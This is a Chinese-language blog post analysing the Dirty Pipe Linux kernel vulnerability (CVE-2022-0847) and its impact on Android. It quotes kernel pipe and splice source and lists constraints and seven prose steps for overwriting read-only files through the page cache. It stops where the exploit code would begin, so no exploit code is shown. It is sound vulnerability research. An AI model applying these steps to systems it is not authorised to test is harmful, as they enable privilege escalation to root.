<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"buffer0verflooow.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="前言CVE-2022-0847也叫Dirty Pipe，该漏洞影响内核5.8以上Linux版本，在5.16.11、5.15.25、5.10.102中修复。由于这个漏洞也影响了Android系统，所以这里主要关注分析对Android系统的影响。 该漏洞能够覆盖任意只读文件，这将导致非特权进程将代码注入到root进程中。 漏洞发现漏洞提交者维护了关于网站的日志管理服务，这个日志服务的功能之一就是打包每">
<meta property="og:type" content="article">
<meta property="og:title" content="DirtyPipe-Android利用">
<meta property="og:url" content="https://buffer0verflooow.github.io/2022/03/28/DirtyPipe-Android%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="buffer0verflooow - Blog">
<meta property="og:description" content="前言CVE-2022-0847也叫Dirty Pipe，该漏洞影响内核5.8以上Linux版本，在5.16.11、5.15.25、5.10.102中修复。由于这个漏洞也影响了Android系统，所以这里主要关注分析对Android系统的影响。 该漏洞能够覆盖任意只读文件，这将导致非特权进程将代码注入到root进程中。 漏洞发现漏洞提交者维护了关于网站的日志管理服务，这个日志服务的功能之一就是打包每">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://buffer0verflooow.github.io/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124007780.png">
<meta property="og:image" content="https://buffer0verflooow.github.io/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124515813.png">
<meta property="article:published_time" content="2022-03-28T11:33:20.000Z">
<meta property="article:modified_time" content="2022-04-17T04:42:45.663Z">
<meta property="article:author" content="buffer0verflooow">
<meta property="article:tag" content="android">
<meta property="article:tag" content="pipe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://buffer0verflooow.github.io/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124007780.png">


<link rel="canonical" href="https://buffer0verflooow.github.io/2022/03/28/DirtyPipe-Android%E5%88%A9%E7%94%A8/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://buffer0verflooow.github.io/2022/03/28/DirtyPipe-Android%E5%88%A9%E7%94%A8/","path":"2022/03/28/DirtyPipe-Android利用/","title":"DirtyPipe-Android利用"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>DirtyPipe-Android利用 | buffer0verflooow - Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">buffer0verflooow - Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="Search" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/home/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="nav-number">2.</span> <span class="nav-text">漏洞发现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E6%A6%82%E5%BF%B5"><span class="nav-number">3.1.</span> <span class="nav-text">一些概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%A1%E9%81%93"><span class="nav-number">3.1.1.</span> <span class="nav-text">管道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#splice%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-number">3.1.2.</span> <span class="nav-text">splice系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">3.1.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-%E5%86%85%E6%A0%B8page-cache%E6%9C%BA%E5%88%B6"><span class="nav-number">3.1.4.</span> <span class="nav-text">linux 内核page cache机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E8%B5%B7%E5%9B%A0"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞起因</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">4.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95"><span class="nav-number">4.1.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="nav-number">4.2.</span> <span class="nav-text">一个例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Android%E5%88%A9%E7%94%A8"><span class="nav-number">4.3.</span> <span class="nav-text">Android利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">4.3.1.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-number">4.3.2.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Information"><span class="nav-number">4.3.2.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E5%AF%B9%E8%AE%BE%E5%A4%87%E7%9A%84%E6%94%AF%E6%8C%81"><span class="nav-number">4.3.2.2.</span> <span class="nav-text">添加对设备的支持</span></a></li></ol></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">buffer0verflooow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/03/28/DirtyPipe-Android%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="DirtyPipe-Android利用 | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          DirtyPipe-Android利用
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-28 19:33:20" itemprop="dateCreated datePublished" datetime="2022-03-28T19:33:20+08:00">2022-03-28</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-04-17 12:42:45" itemprop="dateModified" datetime="2022-04-17T12:42:45+08:00">2022-04-17</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CVE-2022-0847也叫Dirty Pipe，该漏洞影响内核5.8以上Linux版本，在5.16.11、5.15.25、5.10.102中修复。由于这个漏洞也影响了Android系统，所以这里主要关注分析对Android系统的影响。</p>
<p>该漏洞能够覆盖任意只读文件，这将导致非特权进程将代码注入到root进程中。</p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>漏洞提交者维护了关于网站的日志管理服务，这个日志服务的功能之一就是打包每天对应网站每天的访问日志，在月末的时候，提供一个日志下载功能，当用户请求这个功能时，该功能通过HTTP，先发送一个ZIP头，再发送每天的日志压缩包，最后发送一个中央目录（就是另一个头的意思）。这个功能机遇splice()，可以将数据直接从硬盘发送到HTTP连接，省去了将所有日志文件再压缩到一起的这么一个操作，提高了响应效率。</p>
<p>但是，这个功能出现了bug。有用户反馈下载的日志文件损坏，无法解压，这个bug被反馈了很多次。结果就是，漏洞提交者开始找bug，千辛万苦，发现了个新漏洞，可怜的程序员。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ul>
<li><strong>页面</strong>，基于虚拟内存的操作系统中用于内存管理的最小数据单元，最小大小为4kb。</li>
<li><strong>页面缓存</strong>，最近访问过的内存页面，存储在内存中，以加快访问速度，当内核认为该页面不再需要时，就会回收这些页面。通过页面缓存，系统可以直接将页面映射到用户空间，这样就去除了复制的成本。</li>
<li><strong>管道</strong>，对于进程间通信而言，通常使用共享内存页面，其中一个进程读取，另一个进程写入，通常管道跨越多个内存页。</li>
<li><strong>匿名管道</strong>，当进程间共享的信息不占用整个内存页时，可以被另一个管道重用，导致来自不同管道的数据共存于同一个内存页中。</li>
<li><strong>管道标志</strong>，管道标志指定状态和权限等特征。</li>
</ul>
<p><code>splice()</code>在将数据从文件拷贝到管道中时，首先将数据加载到页面缓存中，然后在页面缓存中创建一个<code>struct pipe_buffer</code>指针，但是不同于匿名管道，随后写入的数据不能附加到该页面上，因为该页面的持有者为页面缓存。</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道是内核提供的一种通信机制，由pipe&#x2F;pipe2函数创建，返回两个文件描述符，一个读取，一个写入。</p>
<p><strong>管道在内核中的实现方式</strong></p>
<p>通常管道的缓存空间总长度为65536 个字节，用页的形式进行管理，一共16页，每页4096字节，形成一个环形链表，结构如下：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124007780.png" alt="image-20220309124007780" style="zoom:67%;" />

<p>注意这里的16个页面并不连续，而是通过数组进行表示，<code>pipe-&gt;head</code>负责写入，<code>pipe-&gt;tail</code>负责读取。看一下<code>pipe_write</code>函数，关键之处在于第二步：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">pipe_write</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *from)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span> =</span> iocb-&gt;ki_filp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> head;</span><br><span class="line">	<span class="type">ssize_t</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="type">size_t</span> total_len = iov_iter_count(from);</span><br><span class="line">	<span class="type">ssize_t</span> chars;</span><br><span class="line">	<span class="type">bool</span> was_empty = <span class="literal">false</span>;</span><br><span class="line">	<span class="type">bool</span> wake_next_writer = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">	··· ···</span><br><span class="line">    ··· ···</span><br><span class="line">	head = pipe-&gt;head;</span><br><span class="line">	was_empty = pipe_empty(head, pipe-&gt;tail);</span><br><span class="line">	chars = total_len &amp; (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line">	<span class="keyword">if</span> (chars &amp;&amp; !was_empty) &#123; </span><br><span class="line">        <span class="comment">//[1]pipe 缓存不为空，则尝试是否能从当前最后一页&quot;接着&quot;写</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">		<span class="type">int</span> offset = buf-&gt;offset + buf-&gt;len; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;</span><br><span class="line">		    offset + chars &lt;= PAGE_SIZE) &#123; </span><br><span class="line">            <span class="comment">/*[2]如果PIPE_BUF_FLAG_CAN_MERGE 标志位存在，代表该页允许接着写</span></span><br><span class="line"><span class="comment">             *如果写入长度不会跨页，则接着写，否则直接另起一页 */</span></span><br><span class="line">			ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line">			···</span><br><span class="line">			ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);</span><br><span class="line">			···</span><br><span class="line">			&#125;</span><br><span class="line">			buf-&gt;len += ret;</span><br><span class="line">			···</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;<span class="comment">//[3]如果上一页没法接着写，则重新起一页</span></span><br><span class="line">		··· ···</span><br><span class="line">		head = pipe-&gt;head;</span><br><span class="line">		<span class="keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> pipe-&gt;tmp_page;</span><br><span class="line">			<span class="type">int</span> copied;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!page) &#123;<span class="comment">//[4]重新申请一个新页</span></span><br><span class="line">				page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);</span><br><span class="line">				<span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line">					ret = ret ? : -ENOMEM;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				pipe-&gt;tmp_page = page;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			head = pipe-&gt;head;</span><br><span class="line">			··· ···</span><br><span class="line">			pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			buf-&gt;page = page;<span class="comment">//[5]将新申请的页放到页数组中</span></span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">            	<span class="comment">//[6]设置flag，默认PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">			copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from); </span><br><span class="line">            <span class="comment">//[7]拷贝操作</span></span><br><span class="line">			··· ···</span><br><span class="line">			ret += copied;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">			··· ···</span><br><span class="line">		&#125;</span><br><span class="line">        ··· ···</span><br><span class="line">    &#125;</span><br><span class="line">	··· ···</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="splice系统调用"><a href="#splice系统调用" class="headerlink" title="splice系统调用"></a>splice系统调用</h3><p><strong>定义</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* splice() moves data between two file descriptors without copying </span></span><br><span class="line"><span class="comment"> * between kernel address space and user address space.  </span></span><br><span class="line"><span class="comment"> * It transfers up to len bytes of data from the file descriptor fd_in </span></span><br><span class="line"><span class="comment"> * to the file descriptor fd_out, where one of the file descriptors must refer to a pipe. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">off64_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">                      <span class="type">off64_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>作用</strong></p>
<p>拼接数据。</p>
<p><strong>调用栈如下</strong>：</p>
<ul>
<li><code>SYSCALL_DEFINE6(splice,...)</code> -&gt; <code>__do_sys_splice</code> -&gt; <code>__do_splice</code>-&gt; <code>do_splice</code><ul>
<li><code>splice_file_to_pipe</code> -&gt; <code>do_splice_to</code><ul>
<li><code>generic_file_splice_read</code>(<code>in-&gt;f_op-&gt;splice_read</code> 默认为 <code>generic_file_splice_read</code>)<ul>
<li><code>call_read_iter</code> -&gt; <code>filemap_read</code><ul>
<li><code>copy_page_to_iter</code> -&gt; <code>copy_page_to_iter_pipe</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><code>copy_page_to_iter_pipe</code>将<code>pipe</code> 缓存页结构指向要传输的文件的文件缓存页：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">			 <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line">	<span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line">	··· ···</span><br><span class="line"></span><br><span class="line">	off = i-&gt;iov_offset;</span><br><span class="line">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<span class="comment">//[1]获取对应的pipe缓存页</span></span><br><span class="line">	··· ···</span><br><span class="line">	</span><br><span class="line">	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<span class="comment">//[2]修改pipe缓存页的相关信息指向文件缓存页</span></span><br><span class="line">	get_page(page);</span><br><span class="line">	buf-&gt;page = page;    <span class="comment">//[2]页指针指向了文件缓存页</span></span><br><span class="line">	buf-&gt;offset = offset;<span class="comment">//[2]offset len 等设置为当前信息(通过splice传入参数决定)</span></span><br><span class="line">	buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">	i-&gt;iov_offset = offset + bytes;</span><br><span class="line">	i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">	i-&gt;count -= bytes;</span><br><span class="line">	<span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：splice的零拷贝（是指不需要拷贝动作，来实现数据的传输），是将pipe的缓存页，变为页面缓存，方法是改变指针：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124515813.png" alt="image-20220309124515813" style="zoom:67%;" />

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="linux-内核page-cache机制"><a href="#linux-内核page-cache机制" class="headerlink" title="linux 内核page cache机制"></a>linux 内核page cache机制</h3><p>linux将打开的文件放到<strong>缓存页</strong>之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。</p>
<h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><p><code>PIPE_BUF_FLAG_CAN_MERGE</code>标志是在内核5.8中引入的，第一次<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">commit</a> (f6dd975583bd8ce088400648fd9819e4691c8958)是在2020年5月，表示可以合并页面的管道中的数据，而无需重写内存中的数据。</p>
<p>但起因还要更早一些，在2016年的<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit</a> (241699cd72a8489c9446ae3910ddd243e9b9061b)中，引入了两个新的函数用于分配新的<code>struct pipe_buffer</code>，然而却忘了初始化其flags成员。结合<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志，就可以覆写页面缓存中的数据。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>利用限制：</p>
<ul>
<li>攻击者必须具有读取权限，因为需要将splice()页面放入管道。</li>
<li>偏移量不能在页面边界上，因为该页面的至少一个字节必须已拼接到管道中。</li>
<li>写入不能跨越页面边界，因为将为其余部分创建一个新的匿名管道。</li>
<li>文件无法调整大小，因为管道有自己的页面填充管理，并且不会告诉页面缓存附加了多少数据。</li>
</ul>
<p>利用步骤：</p>
<ol>
<li>以读取模式打开一个文件。</li>
<li>使用pipe()系统调用创建一个管道，此函数为允许写入和读取的描述符提供相同的进程访问权限。</li>
<li>将任意数据写入管道进行填充，将使用<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志初始化内存页面。</li>
<li>所有页面都标记了以后，就可以通过从管道中读取数据来释放它们。</li>
<li>当内核使用2016年引入的函数保存页面时，就不会初始化页面标志，则仍然为<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志。</li>
<li>使用<code>splice()</code>函数加载开始时打开的文件，分配给这个文件的内存页将与我们的空管道相同。</li>
<li>直接覆盖管道中的数据。</li>
</ol>
<p>漏洞提交者给出的exp：</p>
